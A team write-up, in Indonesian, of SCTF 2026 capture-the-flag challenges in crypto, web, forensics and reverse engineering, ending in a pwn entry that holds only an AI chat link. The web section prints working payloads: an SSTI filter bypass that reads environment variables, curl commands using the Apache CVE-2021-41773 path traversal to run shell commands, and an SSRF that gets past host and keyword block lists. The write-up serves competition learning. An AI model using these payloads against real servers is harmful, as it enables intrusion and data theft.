---
slug: "pwn-full-writeup-with-teams-15-place-top-20"
title: "Full Writeup with teams (15 place / top 20)"
competition: "SCTF 2026"
category: "Pwn"
difficulty: "Medium"
date: "2026-07-04"
updated: "2026-07-06"
summary: "SCTF 2026 Presented by : Kata ellie lagi cari team, jadi dia kontak kkarinzzz untuk menjadi membernya, lalu kkarinzzz mengontak claritys untuk menjadi anggota team dan dia setuju Party Members: Ellie Kkarinzzz Claritys (Me)"
tags: ["PWN","REVERSE ENGINEERING","FORENSIC"]
status: "published"
flag: "KTCG Community https://discord.gg/Q5dVVBs6xX"
attachments: []
source: "https://claritys.web.id/writeups/pwn-full-writeup-with-teams-15-place-top-20"
---

# Full Writeup with teams (15 place / top 20)

> SCTF 2026 Presented by : Kata ellie lagi cari team, jadi dia kontak kkarinzzz untuk menjadi membernya, lalu kkarinzzz mengontak claritys untuk menjadi anggota team dan dia setuju  Party Members: Ellie Kkarinzzz  Claritys (Me)

![](https://media1.tenor.com/m/JKpw7pszaqsAAAAd/tendou-alice-blue-archive.gif)

## **SCTF 2026**

![](/assets/uploads/writeup-inline-1f04ea2c-81c9-4c5e-8c2b-28cce3518823.jpg)

**Presented by :**

**Kata ellie lagi cari team, jadi dia kontak kkarinzzz untuk menjadi membernya, lalu kkarinzzz mengontak claritys untuk menjadi anggota team dan dia setuju**

-   **Ellie**

-   **Kkarinzzz**

-   **Claritys**

## **Crytography**

## Warmup

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi : }eheh\_lanoisan\_arauj\_kusam\_asib\_atik\_agomes\_ti\_kcerw\_tuki\_gnay\_ay\_tagnames\_wtb\_his\_ag\_ulud\_pu\_mraw{62FTCS

* * *

Langkah Penyelesaian: Masukin deskripsi itu ke reverse text

![](/assets/uploads/ea50a8f6-10c9-4a8c-8d93-d1bca76527d2-image.png)

* * *

#### Flag: SCTF26{warm\_up\_dulu\_ga\_sih\_btw\_semangat\_ya\_yang\_ikut\_wreck\_it\_semoga\_kita\_bisa\_masuk\_juara\_nasional\_hehe}

* * *

## **Web Exploitation**

## Blog

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi :

Ada sebuah majalah dinding digital di sudut internet.

Pemiliknya dengan hangat menyapa setiap pengunjung secara personal — nama kamu akan terpampang di halaman utama.

Ia sudah waspada terhadap vandalisme. Ada daftar kata-kata yang tidak boleh ditulis, sudah ia tempel di mana-mana.

_Tapi bahasa itu luas. Selalu ada cara lain untuk mengucapkan hal yang sama._

**URL:** **[http://blog.sctf.my.id](http://blog.sctf.my.id/)**

* * *

Langkah Penyelesaian : Disini kita diberitahukan oleh Ellienes bahwa ini web mempunyai kerentanan SSTI di parameternya dan kita dikasih hint untuk tempat flag nya

```jsx
<!-- Try to get the flag from the environment variable FLAG -->
```

![](/assets/uploads/39008146-b7ac-419e-b94d-c1c3f31ce78b-image-1.png)

[SCTF26 Blog](https://blog.sctf.my.id/?name={{7*7}})

![](/assets/uploads/50e33b4f-d2ff-4481-9b84-6a46bba47c4b-image-2.png)

Disini udah fix ada ssti dengan masukkan payload `{{7*7}}` dan muncullah `49`

Saat memasukkan payload :

-   `config`

-   `self`

Ini gabisa, tapi saat :

-   `request`

-   `namespace`

-   `cycler`

-   `{{cycler.``**init**``}}`

-   `{{cycler.``**init**``.``**globals**``}}`

Ini lolos, jadi kubikin payloadnya kaya gini

`{{cycler.``**init**``.``**globals**``.os.environ}}`

`{{cycler.``**init**``.``**globals**``["os"]}}`

Menghasilkan

```jsx
Filtered: os is not allowed!
```

Terus cari cara bypass ban os ketemu

[https://www.linkedin.com/posts/abhishek-jorwal\_cybersecurity-appsec-bugbounty-activity-7363973137643778048-glzs](https://www.linkedin.com/posts/abhishek-jorwal_cybersecurity-appsec-bugbounty-activity-7363973137643778048-glzs)

![](/assets/uploads/293a1d0d-e438-426c-8ceb-f63586ac5d9d-image-3.png)

yang dimana ketika kita memasukkan

```jsx
"o" ~ "s"
akan menjadi
"os"
```

`{{cycler.``**init**``.``**globals**``["o" ~ "s"]}}`

```jsx
Welcome to the Blog, <module 'os' (frozen)>!
Read our latest posts soon!
```

Karena lolos, kita ambil environ nya yaitu FLAG seperti hint diatas

`{{cycler.``**init**``.``**globals**``["o" ~ "s"].environ["FLAG"]}}`

```jsx
Welcome to the Blog, SCTF26{sst1_byp4ss_w1th_str1ng_c0nc4t}!
Read our latest posts soon!
```

Yeay :v

* * *

### Flag: SCTF26{sst1\_byp4ss\_w1th\_str1ng\_c0nc4t}

* * *

## URL Storage

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi :

Sebuah papan pengumuman digital. Siapapun boleh menempel. Siapapun boleh melapor.

Dan setiap laporan yang masuk — pasti dibaca oleh sang moderator setia.

Moderator itu menyimpan sebuah kunci rahasia. Ia tidak pernah membagikannya kepada siapapun.

Tapi setiap kali ia membuka laporan, kunci itu ikut terbawa bersamanya.

_Bisakah kamu membuat laporan yang bisa berbicara sendiri — tanpa suara, tanpa jejak yang terlihat — dan pulang dengan membawa kuncinya?_

_Terinspirasi dari sebuah tantangan klasik CTF tahun 2017._

**URL:** **[http://url-storage.sctf.my.id](http://url-storage.sctf.my.id/)**

* * *

Langkah Penyelesaian: Disini kita diberikan source code yang strukturnya gini

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/web/url]
└─$ tree
.
├── bot
│   ├── bot.js
│   ├── Dockerfile
│   └── package.json
├── docker-compose.yml
├── inject_css.py
└── web
    ├── app.py
    ├── Dockerfile
    ├── requirements.txt
    └── templates
        ├── flag.html
        ├── index.html
        ├── report.html
        └── urlstorage.html

4 directories, 12 files
```

Yang dimana curiga ada `bot` nih keknya udah pasti xss :v. Jadi saya explor dulu di webnya yang dimana ada comment kaya gini

```jsx
    <title>SCTF26 - URL Storage</title>
    <!-- RPO Vulnerability: Relative CSS path -->
    <link rel="stylesheet" href="style.css">
```

Apanih baru ya kan, gatau juga cik RPO ni kekmana. Habistu dikasih writeup sama ellienes [34C3 CTF 2017 - urlstorage writeup - l4w.io](https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/)

Tapi setelah mengikuti itu semwa, gwehj tetap tidak paham. Jadi mari kita baca source code, siapa taw ada hal yang menarik :>

Di bagian `bot.js` ada anuan yang menarik yaitu

```jsx
const res = await axios.get(`${WEB_URL}/api/get_reports`);
```

Yang pas ketika diakses ada wow, berlian cik wkwkwkkw

![](/assets/uploads/f796462a-d8ed-4492-b4e9-d788ce50514b-image-4.png)

```jsx
{"admin_password":"ac745dbcdee1c7ed7e980662f748e7d2","admin_username":"admin","reports":[]}
```

Langsung saja login make creds ini rek wkwkkwkwkw :v

![](/assets/uploads/e865623b-8570-40c9-a182-0cd3e50f2eaa-image-5.png)

Dan yap ketemu rek (baca source code ternyata nemu juga woakwoakwowk)

* * *

### Flag: SCTF26{rp0\_cs5\_l34ks\_4nd\_xs5\_ch41n}

* * *

## Tax Simulator

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi :

Loket pajak ini hanya punya satu petugas.

Ada antrean panjang, dan setiap orang boleh datang dengan voucher diskon — tapi hanya sekali.

Petugas itu jujur, tapi lambat. Ia butuh waktu untuk memproses setiap pengajuan.

Dan selama ia masih memproses... ia belum sempat mencatat bahwa voucher itu sudah dipakai.

_Apa yang terjadi kalau kamu datang ke loket lebih dari sekali di saat yang bersamaan?_

**URL:** **[http://tax.sctf.my.id](http://tax.sctf.my.id/)**

* * *

Langkah Penyelesaian: Disini kita diberikan portal untuk membayar pajak (dimana bumi dipijak, disana saya dipajak)

![](/assets/uploads/1f887f7b-4d01-4374-a441-dfd6c5bcc2c6-image-6.png)

Disini kita bisa menggunakan voucher untuk potongan, jadi karena di KTCG Community ada chall kek gini, langsung nyalain burpsuite → ambil pas bagian kupon pembayaran → duplicate request → send barengan dalam 1 waktu → dapat flag

![](/assets/uploads/cab9608d-e98b-408b-8c29-6d9141efdfa2-image-7.png)

Yeayyy

* * *

### Flag: SCTF26{tax\_systems\_love\_parallel\_requests}

* * *

## Apache Tears

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi :

Di sebuah kota tua, ada perpustakaan bersejarah yang baru saja membuka pintunya kembali setelah renovasi.

Pengelolanya bangga — koleksi lamanya masih lengkap, sistem baru sudah terpasang, semua tampak sempurna.

Tapi ada satu lorong yang dibangun terburu-buru. Satu pintu yang tidak terkunci dengan benar.

Satu jalan yang seharusnya tidak menuju ke mana-mana, tapi nyatanya bisa membawamu ke mana saja.

_Temukan lorong itu._

**URL:** **[http://apache-tears.sctf.my.id](http://apache-tears.sctf.my.id/)**

* * *

Langkah Penyelesaian: Disini dikasi url [http://103.127.98.249:8085](http://103.127.98.249:8085/) yang ketika dibuka isinya begini

![](/assets/uploads/ddc78159-7401-4c8e-893f-4df214945d73-image-8.png)

Ada versi tuh :v, langsung cari exploitnya dan ketemu ini

`**Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)**`

`CVE 2021-41773`

Dan terdapat `cgi-bin` yang akan kita exploit sesuai tutorial path-travelsal.

Yaitu dengan menggunakan encoded kaya

```jsx
.%2e/
```

Jadi path traversal bisa terjadi kaya gini

```jsx
/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
```

Ini bakalan jadi `/bin/sh`

Payload pertama langsung kita kasih RCE

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/web/apache]
└─$ curl --path-as-is -X POST -d 'echo;id' http://103.127.98.249:8085/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Sedapnya ternyata valid coy

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/web/apache]
└─$ curl --path-as-is -X POST -d 'echo;find / -iname "*flag*" 2>/dev/null' http://103.127.98.249:8085/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/sys/devices/pnp0/00:00/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/flag.txt

┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/web/apache]
└─$
```

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/web/apache]
└─$ curl --path-as-is -X POST -d 'echo;cat /flag.txt' http://103.127.98.249:8085/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
SCTF26{4p4ch3_p4th_tr4v3rs4l_cve_2021_41773}
```

Dan yap ketemu coy GG

* * *

### Flag: SCTF26{4p4ch3\_p4th\_tr4v3rs4l\_cve\_2021\_41773}

* * *

### Gudang Makanan

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi :

Gudang ini menyimpan lebih dari sekadar makanan.

Di balik rak-rak besar itu, tersimpan dokumen penting milik sang pemilik — hanya ia yang tahu caranya membuka brankas di balik dinding.

Konon, sang pemilik sering lalai. Ia meninggalkan catatan di tempat yang seharusnya tidak bisa dibaca siapapun.

Dan konon pula, ada cara unik yang ia gunakan untuk membuktikan siapa dirinya kepada gudangnya sendiri.

_Temukan catatannya. Pahami cara berpikirnya. Jadilah dia._

**URL:** **[http://gudang.sctf.my.id](http://gudang.sctf.my.id/)**

* * *

Langkah Penyelesaian: Disini kita diberikan source code yh guys (setelah sekian lama) yang isinya

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/web/gudang]
└─$ tree
.
├── docker-compose.yml
├── internal
│   ├── Dockerfile
│   ├── package.json
│   └── server.js
└── web
    ├── Dockerfile
    ├── package.json
    ├── public
    │   ├── app.js
    │   ├── config.json.bak
    │   ├── index.html
    │   └── style.css
    └── server.js

4 directories, 11 files
```

Di file `docker-compose.yml`

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/web/gudang]
└─$ cat docker-compose.yml
services:
  web:
    build: ./web
    container_name: gudang-web
    ports:
      - "8092:3000"
    networks:
      - frontend
      - backend
    environment:
      - NODE_ENV=production
    restart: unless-stopped

  gudang-api:
    build: ./internal
    container_name: gudang-internal
    networks:
      - backend
    # TIDAK ada port yang di-expose ke host!
    # Hanya bisa diakses dari network docker internal
    environment:
      - NODE_ENV=production
    restart: unless-stopped

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true
```

Disini `gudang-web` expose port `3000` ke host sebagai port `8092` . Jadi bisa diakses lewat `http://127.0.0.1:8092` Service `gudang-api` ga terexpose port ke host. Tapi `gudang-api` sama `web` sama sama di network `backend` jadi dalam container web, host `gudang-api` bisa diresolve DNS Docker Compose.

Saat kita explore `interl/server.js` ada ini

```jsx
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[INTERNAL] Gudang service running on port ${PORT}`);
  console.log(`[INTERNAL] Network: internal-only`);
});
```

Jadi url internalnya adalah `http://gudang-api:8080` diperkuat dengan `web/public/config.json.bak`

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/web/gudang]
└─$ cat web/public/config.json.bak
{
  "app_name": "Gudang Makanan Web",
  "version": "2.3.1",
  "environment": "production",
  "backend_service": {
    "host": "gudang-api",
    "port": 8080,
    "protocol": "http"
  }
```

Lalu di `web/server.js` juga ada endpoint utamanya

```jsx
app.post('/api/check-image', async (req, res) => {
  const { url } = req.body;
  
  ----
  
  const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[WEB] Gudang Makanan Nasional - Web Service`);
  console.log(`[WEB] Running on port ${PORT}`);
  console.log(`[WEB] Environment: ${process.env.NODE_ENV || 'development'}`);
});
```

Karena docker `8092:3000` , endpointnya `http://127.0.0.1:8092/api/check-image`

Web ni memastikan input `url` ada dan tipenya strings

```jsx
  if (!url || typeof url !== 'string') {
    return res.status(400).json({
      success: false,
      error: 'URL gambar diperlukan. Masukkan URL yang valid.'
    });
  }
```

Abistu URL nya diparse

```jsx
let parsed;
    try {
      parsed = new URL(url);
    } catch {
      return res.status(400).json({
        success: false,
        error: 'Format URL tidak valid. Gunakan format: https://domain.com/gambar.png'
      });
    }
```

Web hanya nerima `https:` sama `https://`

```jsx
if (!['http:', 'https:'].includes(parsed.protocol)) {
      return res.status(400).json({
        success: false,
        error: 'Hanya protokol HTTP dan HTTPS yang diizinkan'
      });
    }
```

Karena internal service adalah `HTTP` jadi nanti make `http://`

Ini ada banyak sekali hostname yang blacklist

```jsx
const hostname = parsed.hostname.toLowerCase();
    const blockedHosts = [
      'localhost',
      '127.0.0.1',
      '0.0.0.0',
      '::1',
      '[::1]',
      '0177.0.0.1',
      '0x7f000001',
      '0x7f.0x0.0x0.0x1',
      '2130706433',
      '017700000001',
      '0177.0.0.01',
      '127.0.0.0',
      '127.255.255.255',
      'metadata.google.internal',
      '169.254.169.254'
    ];

    if (blockedHosts.some(h => hostname === h)) {
      return res.status(403).json({
        success: false,
        error: 'Akses ke alamat tersebut tidak diizinkan oleh kebijakan keamanan'
      });
    }
```

Filternya ni bandingin hostname sama daftar blacklist aja si, payload gaperlu make `localhost` atau `127.0.0.1` , karena docker ada nama service internal `gudang-api` karena dia ga diblacklist jadi lolos :v

Terus ada regex untuk blok IP Private

```jsx
const privateIPRegex = /^(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|fc00:|fd[0-9a-f]{2}:)$/i;
    if (privateIPRegex.test(hostname)) {
      return res.status(403).json({
        success: false,
        error: 'Akses ke jaringan privat tidak diizinkan'
      });
    }
```

Regex ni bisa dipake kalo user kirim IP Private kaya eee `http://172.20.0.2:8080/` tapi payload make hostname `gudang-api`

Habistu ni web blok path sensitif

```jsx
const urlPath = decodeURIComponent(parsed.pathname);
    const blockedKeywords = ['internal', 'admin', 'flag', 'secret', 'private', '.env', 'config', 'etc/passwd', 'proc/self'];

    if (blockedKeywords.some(keyword => urlPath.includes(keyword))) {
      return res.status(403).json({
        success: false,
        error: 'Path URL mengandung kata kunci yang tidak diizinkan'
      });
    }
```

Path seperti `/internal/flag.png` akan diblok, Tapi `includes()` di JavaScript case-sensitive. Web tidak melakukan lowercase terhadap `urlPath` sebelum pengecekan. Maka path uppercase ini lolos `/INTERNAL/FLAG.png`

Habistu ni wajib belakangnya extensi gambar

```jsx
const pathLower = parsed.pathname.toLowerCase();
    const validExts = ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.svg', '.bmp', '.ico'];

    if (!validExts.some(ext => pathLower.endsWith(ext))) {
      return res.status(400).json({
        success: false,
        error: 'URL harus mengarah ke file gambar yang valid (.png, .jpg, .jpeg, .gif, .webp, .svg)'
      });
    }
```

Karena itu payload dikasi `.png` jadi `/INTERNAL/FLAG.png` Ini lolos extension check karena `pathLower.endsWith(".png")` bernilai true.

Setelah smwa lolos, website ni ngelakuin request server side

```jsx
const response = await fetch(url, {
      signal: controller.signal,
      headers: {
        'User-Agent': 'GudangMakanan-ImageValidator/2.3',
        'Accept': 'image/*,*/*'
      },
      redirect: 'follow',
      follow: 5
    });
```

Ini dia titik SSRF nya. Request dikirim dari container `gudang-web` karena `gudang-web` satu network sama `gudang-api` jadi ini bisa digunakan.

`http://gudang-api:8080/INTERNAL/FLAG.png`

![](/assets/uploads/30c1d690-a74f-40ac-8a6e-30bafbf13b4c-image-9.png)

* * *

### Flag : **SCTF26{gudang\_makanan\_tidak\_boleh\_bocor}**

* * *

## **Forensic**

## Invisible Ink

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi : Can you read between the lines?

* * *

Langkah Penyelesaian:

![](/assets/uploads/78ee0ebc-732f-4239-b575-338b3744f893-image-10.png)

Pertama-pertama, kita langsung google kalau ini itu apa. Dari situ, dia mention Windows-1252. Gw langsung mencari cara untuk decode Windows-1252.

Turns out, hasil semuanya itu aneh. Jadinya aku coba cek cyberchef apakah ada atau tidak.

![](/assets/uploads/f611f0ed-c2c3-474e-8196-6ae1f2870e23-image-11.png)

Ternyata ada, aku langsung nyoba pakai decode text malah hasilnya sama

![](/assets/uploads/d9131b7b-c24b-4c66-a85f-dcce503c4ec7-image-12.png)

Alhasil aku pakai encode, dan ternyata work. But, hasilnya itu merah merah, aku awalnya tetep bingung sih. Tapi dipikir pikir ini itu mirip zero-width Unicode steganography. Apalagi itu ada UTF-8 detected dari cyberchef pojok kanan bawah. Langsung saja kita tambahkan decode UTF-8.

![](/assets/uploads/aff974dd-b323-489c-a6f3-0a07a9c7230b-image-13.png)

Yaa.. even though sama aja merah merah but it’s different ahh moment. Langsung copy raw to clipboard lalu google tentang zero-width Unicode steganography dan milih web [https://stegzero.com/](https://stegzero.com/).

![](/assets/uploads/ad3537bc-2d1c-4669-bd64-2f64245480cc-image-14.png)

Completed :3

* * *

### Flag: SCTF26{z3r0\_w1dth\_1s\_tr1cky\_f0r\_3y3s}

* * *

## Silent Exfiltration

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi : We noticed strange network traffic. Find out what was stolen.

* * *

Langkah Penyelesaian: Disini kita diberikan file pcap yaitu `silent_exfil.pcap` yang isinya…

![](/assets/uploads/b60ceb95-0960-4ab8-8566-9e9e63f6b039-image-15.png)

Langsung muncul di kepala saya yaitu anomali depan subdomain tuh

```jsx
KNBVIRRSGZ
5WI3TTL4ZX
QZRRNR2HEN
DUGEYG4X3Q
MNQXAXZUNY
2GY6JVGE2X
2
```

Yang kalo digabung jadi

`KNBVIRRSGZ5WI3TTL4ZXQZRRNR2HENDUGEYG4X3QMNQXAXZUNY2GY6JVGE2X2`

Ternyata base32 setelah didecode muncullah flag nya yeay

* * *

### Flag: SCTF26{dns\_3xf1ltr4t10n\_pcap\_4n4ly515}

* * *

## The Matryoshka Doll

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi : There is a secret deeply nested within. Can you uncover it? Note: The password is in plain sight.

* * *

Langkah Penyelesaian: Disini kita diberikan sebuah gambar bernama `the_matryoshka.png` namanya mirip mirip chall yg saya kenal yh…

Pas saya lihat menggunakan exiftool ada tuh passwordnya mungkin untuk sebuah `zip` dalam foto ini untuk dapat flag

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/forensics/the]
└─$ exiftool the_matryoshka.png
ExifTool Version Number         : 13.55
File Name                       : the_matryoshka.png
Directory                       : .
File Size                       : 4.2 kB
File Modification Date/Time     : 2026:07:03 17:04:22+07:00
File Access Date/Time           : 2026:07:03 17:04:43+07:00
File Inode Change Date/Time     : 2026:07:03 17:04:37+07:00
File Permissions                : -rwxr-xr-x
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 800
Image Height                    : 600
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Password                        : SCTF_EXIF_S3CR3T
Image Size                      : 800x600
Megapixels                      : 0.480
```

```jsx
SCTF_EXIF_S3CR3T
```

Itu adalah password untuk sebuah sesuatu, karena ini `.png` saya menggunakan tools bernama `zsteg`

```jsx
┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/forensics/the]
└─$ zsteg the_matryoshka.png
meta Password       .. text: "SCTF_EXIF_S3CR3T"
imagedata           .. file: Microsoft Works 1-3 (DOS) or 2 (Windows) document \377
b1,r,lsb,xy         .. file: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
b2,r,msb,xy         .. text: "_UUUUUUUU"
b4,r,msb,xy         .. text: ["w" repeated 8 times]
b4,bgr,msb,xy       .. file: MPEG ADTS, layer I, v2, Monaural
```

Waduh ada `zip` nih

```jsx
b1,r,lsb,xy         .. file: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
```

Kita ambil zip tersebut menggunakan

```jsx

┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/forensics/the]
└─$ zsteg -E b1,r,lsb,xy the_matryoshka.png > a.zip

┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/forensics/the]
└─$ unzip a.zip
Archive:  a.zip
   skipping: flag.txt                unsupported compression method 99

┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/forensics/the]
└─$ 7z x a.zip

7-Zip 26.01 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-04-27
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:10240, ASM

Scanning the drive for archives:
1 file, 60000 bytes (59 KiB)

Extracting archive: a.zip

WARNINGS:
There are data after the end of archive

--
Path = a.zip
Type = zip
WARNINGS:
There are data after the end of archive
Physical Size = 192
Tail Size = 59808

Enter password (will not be echoed):
Everything is Ok

Archives with Warnings: 1

Warnings: 1
Size:       26
Compressed: 60000

┌──(kkarinzzz㉿DESKTOP-TM80IKF)-[~/sctf/forensics/the]
└─$ ls
a.zip  flag.txt  the_matryoshka.png
```

Dan yap dapat deh flag nya :v

* * *

### Flag: SCTF26{m4try0shk4\_lsb\_z1p}

* * *

## **Reverse Engineering**

## PYMalware

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi:

A Python script compiled with PyInstaller that uses XOR obfuscation.

* * *

Langkah Penyelesaian: Diberikan file yang berisikan

```jsx
┌──(alya㉿ally)-[/mnt/c/Users/alyaf/Downloads/dist]
└─$ tree
├── chall.py
├── cipher.py
└── pymalware
```

Disini saya cek file `pymalware` menggunakan perintah `file`.

```jsx
└─$ file pymalware
pymalware: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=34f6ce77833f8dc35eb938b6683c0edc0292f637, stripped
```

Dari hasilnya sih `pymalware` itu binary ELF. Disini saya langsung menggunakan **Detect It Easy (DIEC)** untuk mengetahui apakah binary tersebut menggunakan packer tertentu.

```jsx
─(alya㉿ally)-[mnt/c/Users/alyaf/Downloads/dist]
└─$ diec pymalware 
ELF64
    Compiler: GCC((Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0)
    Library: GLIBC(2.7)[EXEC AMD64-64]
    Packer: PyInstaller
```

Nah, hasil analisis terlihat bahwa binary tersebut di packer menggunakan `PyInstaller`. Karena binary dibuat menggunakan PyInstaller, maka disini saya sung ekstrak isi executablenya menggunakan `pyinstxtractor`.

```jsx
──(alya㉿ally)-[/mnt/c/Users/alyaf/Downloads/dist]
└─$ python3 pyinstxtractor.py pymalware
```

Dari hasil extract terdapat beberapa file salah satunya `pymalware.pyc`

```jsx
 pymalware_extracted
    ├── base_library.zip
    ├── libbz2.so.1.0
    ├── libcrypto.so.1.1
    ├── libexpat.so.1
    ├── liblzma.so.5
    ├── libmpdec.so.3
    ├── libpython3.9.so.1.0
    ├── libz.so.1
    ├── pyiboot01_bootstrap.pyc
    ├── pyimod01_archive.pyc
    ├── pyimod02_importers.pyc
    ├── pyimod03_ctypes.pyc
    ├── pymalware.pyc
```

Disini saya perlu decompile lagi menggunakan **[PyLingual Python Decompiler](https://pylingual.io/)****.** Hasil decompilenya

```jsx
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'pymalware.py'
# Bytecode version: 3.9.0beta5 (3425)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import base64
import sys
def check_flag(flag):
    enc = base64.b64encode(flag.encode()).decode()
    key = 42
    out = ''.join((chr(ord(c) ^ key) for c in enc))
    target = 'IHOExx12}KHDEeHx18OXHx1bEXDOx13ex13Ix1fEXDx15'
    target = 'I0VHRzI2e3B5dGhvbl9yZXZlcnNpbmdfaXNfZnVufQ=='
    target_encoded = ''.join((chr(ord(c) ^ key) for c in target))
    return out == target_encoded
if __name__ == '__main__':
    flag = input('Enter flag: ')
    if check_flag(flag):
        print('Correct!')
    else:
        print('Wrong!')
```

Disini saya awalnya decode pesan I0VHRzI2e3B5dGhvbl9yZXZlcnNpbmdfaXNfZnVufQ== menggunakan base 64.

![](/assets/uploads/71283e80-a9d1-4168-89c9-99ef1c89bbea-image-16.png)

Hasilnya EGG26{python\_reversing\_is\_fun} sempet kekirim tp salah:V, tapi disini saya ubah formatnya jadi SCTF26{python\_reversing\_is\_fun} eeh benar.

* * *

### Flag: SCTF26{python\_reversing\_is\_fun}

* * *

## Bank Vault

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi:

An ATM simulation with a custom encryption algorithm for the PIN.

* * *

Langkah Penyelesaian:

Link AI:

[https://chatgpt.com/share/6a487751-ee44-83ec-99fa-6b7e10a341d4](https://chatgpt.com/share/6a487751-ee44-83ec-99fa-6b7e10a341d4)

Awalnya, aku decompile ini menggunakan dogbolt.org, setelah itu aku baca dulu hasilnya.

```python
//----- (0000000000001185) ----------------------------------------------------
__int64 *__fastcall sub_1185(__int64 a1, __int64 *a2)
{
  *a2 = (1337 * (a1 ^ 0xDEADBEEFLL)) ^ 0xCAFEBABELL;
  return a2;
}

//----- (00000000000011C3) ----------------------------------------------------
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-38h] BYREF
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v6; // [rsp+38h] [rbp-8h]

  puts("--- SCTF Secure Bank ATM ---");
  printf("Enter 8-digit master PIN: ");
  if ( !fgets(s, 32, stdin) )
    return 1;
  s[strcspn(s, "\n")] = 0;
  if ( strlen(s) == 8 )
  {
    v6 = atoll(s);
    sub_1185(v6, &v4);
    if ( v4 == 0x48CF6EA6484LL )
    {
      puts("Access Granted!");
      printf("Flag: SCTF26{w3lc0m3_t0_th3_v4ult_p1n_%lld}\n", v6);
    }
    else
    {
      puts("Access Denied.");
    }
    return 0;
  }
  else
  {
    puts("Invalid PIN length!");
    return 1;
  }
}
```

[https://dogbolt.org/?id=8678fb7f-85ab-4309-a9eb-24d7fadc7ad3#Hex-Rays=183](https://dogbolt.org/?id=8678fb7f-85ab-4309-a9eb-24d7fadc7ad3#Hex-Rays=183)

And turns out ya, aku awalnya tuh ngira tinggal pakai 0x48CF6EA6484LL aja buat masukin biar dapet flag, eh ternyata malah invalid. Karena lengthnya itu hanya bisa 8. Nah, setelah mikir lama, akhirnya temenku itu ngasih screenshot decompile kalau dari IDA langsung

![](/assets/uploads/89cfc4c5-137c-446f-ab61-55427808aa3a-image-17.png)

Gw liat langsung kepikiran. Eh ngapain aku nyari tau passwordnya ya, tinggal hitung v6 nya aja. Aku sadarnya ditengah tengah chattingan sama ChatGPT. Akhirnya tinggal masukin dari part yang 1 yaitu SCTF26{w3lc0m3\_t0\_th3\_v4ult\_p1n\_ dan digabungkan dengan v6, yang isinya adalah 9147487905852048613.

Done

* * *

### Flag: SCTF26{w3lc0m3\_t0\_th3\_v4ult\_p1n\_9147487905852048613}

* * *

## **PWN**

## Koperasi

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi : Sistem Koperasi Desa Suka Maju baru saja direvolusi menjadi digital. Namun, Kepala Desa mencium aroma busuk: kas mereka terus menyusut padahal tidak ada laporan kerugian! Diduga ada celah matematis yang memungkinkan peretas menggandakan uang mereka dari udara kosong. Tugasmu adalah menjadi auditor keamanan dadakan dan menguras kas tersebut untuk membuktikan kebobrokannya! nc 103.127.98.249 5002

* * *

Langkah Penyelesaian:

Link AI:

[https://claude.ai/share/08a9aadd-7372-437c-9bf3-6ea829de2f13](https://claude.ai/share/08a9aadd-7372-437c-9bf3-6ea829de2f13)

